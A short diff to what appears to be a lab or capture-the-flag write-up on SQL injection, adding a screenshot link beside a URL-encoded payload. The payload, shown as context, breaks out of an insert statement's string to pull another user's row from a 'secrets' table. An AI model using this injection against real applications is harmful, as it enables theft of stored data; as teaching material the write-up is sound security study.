@@ -235,6 +235,7 @@ URL-encoded version:
 ```text
 content=x%27%29%2C%20%28%28SELECT%20id%20FROM%20users%20WHERE%20username%3D%27test%27%20LIMIT%201%29%2C%20%28SELECT%20content%20FROM%20secrets%20WHERE%20owner_id%3D%27e2a66f7d-2ce6-4861-b4aa-be8e069601cb%27%20LIMIT%201%29%29--%20
 ```
+![SQL injection payload in Repeater](assets/repeater_payload.png)
 
 Conceptually, the injected query becomes:
 
